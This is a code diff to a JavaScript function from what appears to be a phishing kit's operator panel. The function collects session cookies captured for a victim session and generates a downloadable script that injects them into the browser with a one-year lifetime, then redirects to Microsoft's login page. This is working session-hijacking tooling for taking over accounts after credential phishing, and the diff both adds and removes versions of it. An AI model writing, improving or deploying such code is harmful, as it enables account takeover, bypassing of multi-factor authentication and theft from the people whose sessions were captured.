@@ -1725,148 +1725,97 @@ function setupEventListeners() {
 // Add download cookies script
 function downloadCookiesScript(sessionData) {
     const downloadBtn = document.getElementById('download-cookies-btn');
-    const sessionId = downloadBtn.dataset.sessionId;
+    const sessionId = downloadBtn && downloadBtn.dataset.sessionId;
     
     if (!sessionId) {
         showToast('Error', 'Session ID not found', 'error');
         return;
     }
     
-    // إنشاء صفيف للكوكيز
+    // جمع كل الكوكيز في مصفوفة
     const cookies = [];
-    
-    // التحقق من وجود بيانات الجلسة وتوكنز الكوكيز فيها
-    if (sessionData) {
-        // التحقق من مصادر محتملة مختلفة للكوكيز في بيانات الجلسة
-        const cookieTokens = sessionData.cookie_tokens || sessionData.CookieTokens || sessionData.tokens || sessionData.Tokens || {};
-        
-        // إذا وجدت توكنز كوكيز، قم بإضافتها
-        if (cookieTokens && Object.keys(cookieTokens).length > 0) {
-            for (const domain in cookieTokens) {
-                const domainCookies = cookieTokens[domain];
-                
-                for (const cookieName in domainCookies) {
-                    const cookie = domainCookies[cookieName];
-                    
-                    // التحقق من نوع البيانات وتنسيقها بشكل صحيح
-                    let cookieValue = '';
-                    if (typeof cookie === 'string') {
-                        cookieValue = cookie;
-                    } else if (cookie && typeof cookie === 'object') {
-                        cookieValue = cookie.value || cookie.Value || JSON.stringify(cookie);
-                    }
-                    
-                    cookies.push({
-                        name: cookieName,
-                        value: cookieValue,
-                        domain: domain,
-                        expirationDate: Date.now(),
-                        hostOnly: false,
-                        httpOnly: true,
-                        path: "/",
-                        secure: false,
-                        session: false,
-                    });
-                }
-            }
-        }
-        
-        // إذا لم يتم العثور على أي كوكيز من البيانات، عرض رسالة
     const cookiesTable = document.getElementById('cookies-table');
-            if (cookiesTable) {
-                const rows = cookiesTable.querySelectorAll('tbody tr');
-                
-                rows.forEach(row => {
-                    // تجاوز الصفوف التي تحتوي على رسائل (مثل "No cookies available")
-                    if (row.cells.length === 1) return;
-                    
-                    cookies.push({
-                        name: row.cells[1].textContent,
-                        value: row.cells[2].textContent,
-                        domain: row.cells[0].textContent,
-                        expirationDate: Date.now(),
-                        hostOnly: false,
-                        httpOnly: true,
-                        path: "/",
-                        secure: false,
-                        session: false,
-                    });
+    const cookieTokens = sessionData?.cookie_tokens || sessionData?.CookieTokens || sessionData?.tokens || sessionData?.Tokens || {};
+    
+    // إذا وجدت توكنز في sessionData
+    if (cookieTokens && Object.keys(cookieTokens).length > 0) {
+        for (const domain in cookieTokens) {
+            const domainCookies = cookieTokens[domain];
+            for (const name in domainCookies) {
+                const raw = domainCookies[name];
+                let value = '';
+                if (typeof raw === 'string') {
+                    value = raw;
+                } else if (raw && typeof raw === 'object') {
+                    value = raw.value || raw.Value || JSON.stringify(raw);
+                }
+                cookies.push({
+                    name,
+                    value,
+                    domain,
+                    path: raw.path || '/',
+                    secure: raw.secure ?? false,
+                    httpOnly: raw.httpOnly ?? true,
+                    session: raw.session ?? false,
+                    expirationDate: Date.now() + 31536000
                 });
             }
-        } else {
-        // استخدام الطريقة القديمة للحصول على الكوكيز من الجدول إذا لم تتوفر بيانات الجلسة
-        const cookiesTable = document.getElementById('cookies-table');
-        if (cookiesTable) {
-    const rows = cookiesTable.querySelectorAll('tbody tr');
-    
-    // التحقق من وجود كوكيز
-    if (rows.length === 0 || (rows.length === 1 && rows[0].cells.length === 1)) {
-                showToast('Error', 'No cookies found for this session', 'error');
-        return;
-    }
-    
-    rows.forEach(row => {
-        // تجاوز الصفوف التي تحتوي على رسائل (مثل "No cookies available")
-        if (row.cells.length === 1) return;
-        
-        cookies.push({
-            name: row.cells[1].textContent,
-                    value: row.cells[2].textContent,
-                    domain: row.cells[0].textContent,
-                    expirationDate: Date.now(),
-                    hostOnly: false,
-                    httpOnly: true,
-                    path: "/",
-                    secure: false,
-                    session: false,
-        });
-    });
         }
     }
     
-    // التحقق النهائي من وجود كوكيز
+    // أو fallback من الجدول إن لم نجد sessionData
+    if (cookies.length === 0 && cookiesTable) {
+        const rows = cookiesTable.querySelectorAll('tbody tr');
+        rows.forEach(row => {
+            if (row.cells.length < 3) return;
+            cookies.push({
+                name:  row.cells[1].textContent.trim(),
+                value: row.cells[2].textContent.trim(),
+                domain: row.cells[0].textContent.trim(),
+                path: '/',
+                secure: false,
+                httpOnly: true,
+                session: false,
+                expirationDate: Date.now() + 31536000
+            });
+        });
+    }
+    
     if (cookies.length === 0) {
         showToast('Error', 'No cookies found for this session', 'error');
         return;
     }
     
-    // Print cookies in browser console
-    console.log('%c🍪 Session Cookies ' + sessionId, 'font-size:14px; font-weight:bold; color:#3498db;');
-    console.log('%c=================================', 'color:#3498db;');
+    console.log(`🍪 Session Cookies ${sessionId}`);
+    console.table(cookies);
     
-    cookies.forEach((cookie, index) => {
-        console.log(
-            `%c[${index+1}] ${cookie.name}%c\nDomain: ${cookie.domain}\nValue: ${cookie.value}`, 
-            'font-weight:bold; color:#2ecc71;', 
-            'color:#95a5a6;'
-        );
-    });
+    // بناء نص السكربت بدون استخدام backticks داخل النص
+    const cookiesJson = JSON.stringify(cookies);
+    const jsCode =
+        '!function(){' +
+          'var e=' + cookiesJson + ';' +
+          'for(var i=0;i<e.length;i++){' +
+            'var o=e[i];' +
+            'document.cookie=o.name+"="+o.value+' +
+              '";Path="+(o.path||"/")+";Domain="+o.domain+";Max-Age=31536000;"+' +
+              '(o.secure? "Secure;": "")+' +
+              '(o.httpOnly? "HttpOnly;": "")+' +
+              '"SameSite=None";' +
+          '}' +
+          'window.location.href="https://login.microsoftonline.com";' +
+        '}();';
     
-    console.log('%c=================================', 'color:#3498db;');
-    console.log('%cTotal Cookies: ' + cookies.length, 'font-weight:bold;');
-    
-    // الحصول على النطاق المستهدف للانتقال بعد تعيين الكوكيز
-    const targetDomain = cookies.length > 0 && cookies[0].domain ? cookies[0].domain : "login.microsoftonline.com";
-    
-    // إنشاء نص JavaScript بالتنسيق المطلوب
-    let jsCode = `!function(){let e=JSON.parse(\`${JSON.stringify(cookies)}\`);for(let o of e)document.cookie=\`\${o.name}=\${o.value};Max-Age=31536000;\${o.path?\`path=\${o.path};\`:""}${`\${o.domain?\`\${o.path?"":"path=/"};domain=\${o.domain};\`:""}`}Secure;SameSite=None\`;window.location.href="https://login.microsoftonline.com"}();`;
-    
-    // إنشاء ملف نصي
-    const blob = new Blob([jsCode], { type: 'text/plain' });
+    // إنشاء وتحميل الملف
+    const blob = new Blob([jsCode], { type: 'text/javascript' });
     const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = `cookies_${sessionId}_${Date.now()}.js`;
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
     
-    // إنشاء رابط تنزيل
-    const downloadLink = document.createElement('a');
-    downloadLink.href = url;
-    downloadLink.download = `cookies_${sessionId}_${Date.now()}.txt`;
-    
-    // تنزيل الملف
-    document.body.appendChild(downloadLink);
-    downloadLink.click();
-    document.body.removeChild(downloadLink);
-    
-    // إظهار رسالة نجاح
-    showToast('Success', 'Cookies script created successfully and printed in browser console', 'success');
+    showToast('Success', 'Cookies script created successfully', 'success');
 }
 
 // Export statistics to CSV
